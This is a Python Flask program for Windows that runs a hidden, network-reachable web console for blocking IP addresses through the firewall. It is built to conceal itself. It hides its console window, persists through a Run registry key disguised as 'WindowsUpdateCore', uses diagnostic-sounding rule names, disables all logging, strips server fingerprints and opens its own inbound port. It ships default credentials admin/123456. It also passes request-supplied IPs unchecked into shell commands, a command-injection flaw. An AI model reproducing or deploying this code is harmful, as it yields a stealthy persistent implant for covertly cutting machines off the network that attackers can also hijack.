import os
import json
import time
import threading
import subprocess
import sys
import winreg
import ctypes
from functools import wraps
from flask import Flask, request, jsonify, render_template_string, Response

# 兼容 PyInstaller 打包后的运行路径
if getattr(sys, 'frozen', False):
    application_path = os.path.dirname(sys.executable)
else:
    application_path = os.path.dirname(os.path.abspath(__file__))

CONFIG_FILE = os.path.join(application_path, 'config.json')

app = Flask(__name__)

# --- 全局隐蔽开关 ---
SILENT_MODE = True  # True = 完全静默，不写任何日志；False = 写临时目录日志
LOG_FILE = os.path.join(os.environ.get('TEMP', application_path), 'wucore.dat')

def silent_log(msg):
    """仅在非静默模式下写入日志"""
    if not SILENT_MODE:
        try:
            with open(LOG_FILE, 'a', encoding='utf-8') as f:
                f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} | {msg}\n")
        except Exception:
            pass

# --- 内存中的状态缓存 ---
current_blocked_ips = set()
last_mtime = 0

# --- 隐蔽配置 ---
RULE_PREFIX = "CoreNet-Diag-Block-"
REG_NAME = "WindowsUpdateCore"  # 注册表自启动项名称（伪装系统组件）
DEFAULT_CONFIG = {
    "web_port": 51883,
    "admin_user": "admin",
    "admin_pass": "123456",
    "blocked_ips": []
}

# --- 配置读写 ---
def load_config():
    if not os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
            json.dump(DEFAULT_CONFIG, f, indent=4)
        return DEFAULT_CONFIG
    try:
        with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return DEFAULT_CONFIG

def save_config(config):
    with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
        json.dump(config, f, indent=4)

# --- 防火墙底层操作 ---
def execute_cmd(cmd):
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        result = subprocess.run(cmd, shell=True, capture_output=True, text=False, startupinfo=startupinfo)
        return result.returncode == 0
    except Exception:
        return False

# ============ 系统检查与自启动模块 ============

def get_app_path():
    if getattr(sys, 'frozen', False):
        return sys.executable
    return os.path.abspath(sys.argv[0])

def check_firewall_status():
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        result = subprocess.run(
            ['powershell', '-WindowStyle', 'Hidden', '-Command',
             'Get-NetFirewallProfile | Select-Object Name, Enabled | ConvertTo-Json -Compress'],
            capture_output=True, text=True, startupinfo=startupinfo
        )
        if result.returncode == 0:
            profiles = json.loads(result.stdout)
            if not isinstance(profiles, list):
                profiles = [profiles]
            disabled = [p['Name'] for p in profiles if not p.get('Enabled')]
            if disabled:
                return False, f"防火墙未开启: {', '.join(disabled)}"
            return True, "防火墙运行正常"
    except Exception as e:
        return None, f"检测异常: {e}"

def enable_firewall():
    """静默开启所有防火墙配置文件"""
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        cmd = (
            'powershell -WindowStyle Hidden -Command "'
            'Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled True; '
            'Write-Host \'OK\'"'
        )
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, startupinfo=startupinfo)
        return result.returncode == 0 and 'OK' in result.stdout
    except Exception:
        return False

def ensure_self_port_allowed(port):
    rule_name = f"{RULE_PREFIX}Self-Allow-{port}"
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

    check_cmd = (
        f'powershell -WindowStyle Hidden -Command "'
        f'try {{ '
        f'    Get-NetFirewallRule -DisplayName \'{rule_name}\' -ErrorAction Stop | Out-Null; '
        f'    Write-Host \'EXISTS\' '
        f'}} catch {{ '
        f'    Write-Host \'NOTFOUND\' '
        f'}}"'
    )
    result = subprocess.run(check_cmd, shell=True, capture_output=True, text=True, startupinfo=startupinfo)
    if 'EXISTS' in result.stdout:
        return True, "自身端口已放行"

    cmd = (
        f'netsh advfirewall firewall add rule '
        f'name="{rule_name}" dir=in action=allow '
        f'protocol=tcp localport={port} '
        f'enable=yes'
    )
    success = execute_cmd(cmd)
    if success:
        return True, f"已放行端口 {port}"
    return False, "放行端口失败（需管理员权限）"

def add_to_startup():
    try:
        app_path = get_app_path()
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, REG_NAME, 0, winreg.REG_SZ, f'"{app_path}"')
        return True
    except Exception:
        return False

def remove_from_startup():
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.DeleteValue(key, REG_NAME)
        return True
    except FileNotFoundError:
        return True
    except Exception:
        return False

def is_in_startup():
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ) as key:
            winreg.QueryValueEx(key, REG_NAME)
            return True
    except FileNotFoundError:
        return False

def hide_console():
    """双重保险隐藏控制台窗口"""
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE
    except Exception:
        pass

# --- 核心防火墙规则操作 ---
def add_firewall_rule(ip):
    rule_name = f"{RULE_PREFIX}{ip}"
    cmd_in = f'netsh advfirewall firewall add rule name="{rule_name}" dir=in action=block remoteip={ip}'
    cmd_out = f'netsh advfirewall firewall add rule name="{rule_name}" dir=out action=block remoteip={ip}'
    return execute_cmd(cmd_in) and execute_cmd(cmd_out)

def remove_firewall_rule(ip):
    rule_name = f"{RULE_PREFIX}{ip}"
    cmd = f'netsh advfirewall firewall delete rule name="{rule_name}"'
    return execute_cmd(cmd)

# --- 核心：配置文件热更新与同步引擎 ---
def sync_firewall():
    global current_blocked_ips
    config = load_config()
    target_ips = set(config.get('blocked_ips', []))
    
    ips_to_add = target_ips - current_blocked_ips
    for ip in ips_to_add:
        add_firewall_rule(ip)
        
    ips_to_remove = current_blocked_ips - target_ips
    for ip in ips_to_remove:
        remove_firewall_rule(ip)
        
    current_blocked_ips = target_ips

def config_watcher():
    global last_mtime
    while True:
        try:
            if os.path.exists(CONFIG_FILE):
                mtime = os.path.getmtime(CONFIG_FILE)
                if mtime != last_mtime:
                    sync_firewall()
                    last_mtime = mtime
        except Exception:
            pass
        time.sleep(3)

# --- Web 鉴权与路由 ---
def check_auth(username, password):
    cfg = load_config()
    return username == cfg.get('admin_user') and password == cfg.get('admin_pass')

def authenticate():
    return Response('拒绝访问\n', 401, {'WWW-Authenticate': 'Basic realm="系统认证"'})

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)
    return decorated

# --- 抹掉服务器指纹 ---
@app.after_request
def remove_server_header(response):
    response.headers.pop('Server', None)
    response.headers.pop('X-Powered-By', None)
    return response

@app.errorhandler(404)
def not_found(e):
    return Response('Not Found', 404)

@app.route('/')
@requires_auth
def index():
    cfg = load_config()
    html_template = """
    <!DOCTYPE html>
    <html lang="zh-CN">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>系统网络诊断工具</title>
        <style>
            *{margin:0;padding:0;box-sizing:border-box}
            body{font-family:"Segoe UI",system-ui,-apple-system,sans-serif;background:#f0f2f5;color:#333;font-size:14px}
            .container{max-width:800px;margin:40px auto;padding:0 20px}
            h3{font-size:18px;color:#555;margin-bottom:20px;font-weight:600}
            .card{background:#fff;border:1px solid #d1d5db;border-radius:4px;margin-bottom:16px;box-shadow:0 1px 3px rgba(0,0,0,.08)}
            .card-header{padding:12px 16px;background:#f8f9fa;border-bottom:1px solid #e5e7eb;font-weight:600;color:#444;font-size:13px;display:flex;justify-content:space-between;align-items:center}
            .card-body{padding:16px}
            .status-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;text-align:center}
            .status-item small{display:block;color:#6b7280;font-size:12px;margin-bottom:4px}
            .status-item span{font-size:14px}
            .text-success{color:#059669}.text-danger{color:#dc2626}.text-warning{color:#d97706}
            .btn{padding:6px 14px;border:1px solid #d1d5db;background:#fff;color:#374151;border-radius:4px;cursor:pointer;font-size:13px}
            .btn:hover{background:#f3f4f6}
            .btn-secondary{background:#6b7280;color:#fff;border-color:#6b7280}
            .btn-secondary:hover{background:#4b5563}
            .btn-success{color:#059669;border-color:#059669;background:#fff}
            .btn-success:hover{background:#ecfdf5}
            .btn-danger{color:#dc2626;border-color:#dc2626;background:#fff}
            .btn-danger:hover{background:#fef2f2}
            .btn-sm{padding:4px 10px;font-size:12px}
            input[type=text]{padding:8px 12px;border:1px solid #d1d5db;border-radius:4px;flex:1;font-size:13px;outline:none}
            input[type=text]:focus{border-color:#6b7280}
            .d-flex{display:flex;gap:10px}
            table{width:100%;border-collapse:collapse;font-size:13px}
            th,td{padding:10px 16px;text-align:left;border-bottom:1px solid #e5e7eb}
            th{background:#f8f9fa;color:#6b7280;font-weight:600;font-size:12px}
            .text-end{text-align:right}
            .text-danger{color:#dc2626;font-weight:600}
            .text-muted{color:#6b7280}
            .empty{padding:24px;text-align:center;color:#9ca3af}
        </style>
    </head>
    <body>
        <div class="container">
            <h3>⚙️ 网络诊断与终端隔离控制台</h3>
            
            <div class="card">
                <div class="card-header">
                    <span>系统状态</span>
                    <button class="btn btn-sm" onclick="refreshStatus()">刷新</button>
                </div>
                <div class="card-body">
                    <div class="status-grid">
                        <div class="status-item">
                            <small>Windows 防火墙</small>
                            <span id="fwStatus">检测中...</span>
                        </div>
                        <div class="status-item">
                            <small>本机服务端口</small>
                            <span id="portStatus">检测中...</span>
                        </div>
                        <div class="status-item">
                            <small>开机自启动</small>
                            <div style="display:flex;align-items:center;justify-content:center;gap:8px;margin-top:4px">
                                <span id="startupStatus">检测中...</span>
                                <button id="startupBtn" class="btn btn-sm" onclick="toggleStartup()">--</button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="card">
                <div class="card-body">
                    <form id="addForm" class="d-flex">
                        <input type="text" id="ipInput" placeholder="输入目标 IPv4 地址" required>
                        <button type="submit" class="btn btn-secondary">隔离拦截</button>
                    </form>
                </div>
            </div>
            
            <div class="card">
                <div class="card-header">已隔离终端列表</div>
                <div class="card-body" style="padding:0">
                    <table>
                        <thead><tr><th>IP 地址</th><th class="text-end">操作</th></tr></thead>
                        <tbody>
                            {% for ip in ips %}
                            <tr>
                                <td class="text-danger">{{ ip }}</td>
                                <td class="text-end"><button class="btn btn-sm btn-success" onclick="unblockIp('{{ ip }}')">恢复连接</button></td>
                            </tr>
                            {% else %}
                            <tr><td colspan="2" class="empty">暂无隔离终端</td></tr>
                            {% endfor %}
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
        <script>
            function refreshStatus() {
                fetch('/api/status').then(r => r.json()).then(data => {
                    const fwEl = document.getElementById('fwStatus');
                    fwEl.textContent = data.firewall_message;
                    fwEl.className = (data.firewall_enabled === true ? 'text-success' : (data.firewall_enabled === false ? 'text-danger' : 'text-warning'));
                    
                    const portEl = document.getElementById('portStatus');
                    portEl.textContent = data.self_port_message;
                    portEl.className = data.self_port_allowed ? 'text-success' : 'text-warning';
                    
                    const stEl = document.getElementById('startupStatus');
                    stEl.textContent = data.startup_enabled ? '已启用' : '未启用';
                    
                    const btn = document.getElementById('startupBtn');
                    const action = data.startup_enabled ? 'disable' : 'enable';
                    btn.textContent = data.startup_enabled ? '关闭' : '启用';
                    btn.className = 'btn btn-sm ' + (data.startup_enabled ? 'btn-danger' : 'btn-success');
                    btn.onclick = () => toggleStartup(action);
                });
            }
            function toggleStartup(action) {
                fetch('/api/startup', {
                    method: 'POST', headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({action: action})
                }).then(r => r.json()).then(() => refreshStatus());
            }
            document.getElementById('addForm').addEventListener('submit', function(e) {
                e.preventDefault();
                fetch('/api/block', {
                    method: 'POST', headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ip: document.getElementById('ipInput').value.trim()})
                }).then(res => res.json()).then(data => location.reload());
            });
            function unblockIp(ip) {
                if(!confirm('确定要恢复 ' + ip + ' 的网络连接吗？')) return;
                fetch('/api/unblock', {
                    method: 'POST', headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ip: ip})
                }).then(res => res.json()).then(data => location.reload());
            }
            document.addEventListener('DOMContentLoaded', refreshStatus);
        </script>
    </body>
    </html>
    """
    return render_template_string(html_template, ips=cfg.get('blocked_ips', []))

@app.route('/api/status')
@requires_auth
def status_api():
    cfg = load_config()
    fw_ok, fw_msg = check_firewall_status()
    port_ok, port_msg = ensure_self_port_allowed(cfg.get('web_port', 51883))
    return jsonify({
        "firewall_enabled": fw_ok,
        "firewall_message": fw_msg,
        "self_port_allowed": port_ok,
        "self_port_message": port_msg,
        "startup_enabled": is_in_startup()
    })

@app.route('/api/startup', methods=['POST'])
@requires_auth
def startup_api():
    action = request.json.get('action')
    if action == 'enable':
        success = add_to_startup()
    elif action == 'disable':
        success = remove_from_startup()
    else:
        return jsonify({"success": False, "error": "无效的操作"})
    return jsonify({"success": success, "enabled": is_in_startup()})

@app.route('/api/block', methods=['POST'])
@requires_auth
def block_api():
    cfg = load_config()
    ip = request.json.get('ip')
    if ip and ip not in cfg['blocked_ips']:
        cfg['blocked_ips'].append(ip)
        save_config(cfg)
    return jsonify({"success": True})

@app.route('/api/unblock', methods=['POST'])
@requires_auth
def unblock_api():
    cfg = load_config()
    ip = request.json.get('ip')
    if ip in cfg['blocked_ips']:
        cfg['blocked_ips'].remove(ip)
        save_config(cfg)
    return jsonify({"success": True})

if __name__ == '__main__':
    # 立即隐藏控制台窗口（双重保险）
    hide_console()
    
    # 清理历史死规则
    execute_cmd(f'powershell -WindowStyle Hidden -Command "Remove-NetFirewallRule -DisplayName \'{RULE_PREFIX}*\' -ErrorAction SilentlyContinue"')
    
    cfg = load_config()
    port = cfg.get('web_port', 51883)
    
    # 静默检查并开启防火墙
    fw_ok_before, _ = check_firewall_status()
    if not fw_ok_before:
        enable_firewall()
    
    # 静默放行自身端口
    ensure_self_port_allowed(port)
    
    sync_firewall()
    
    # 启动文件监视器
    threading.Thread(target=config_watcher, daemon=True).start()
    
    # 彻底关闭 Flask 日志输出
    import logging
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    log.disabled = True
    
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
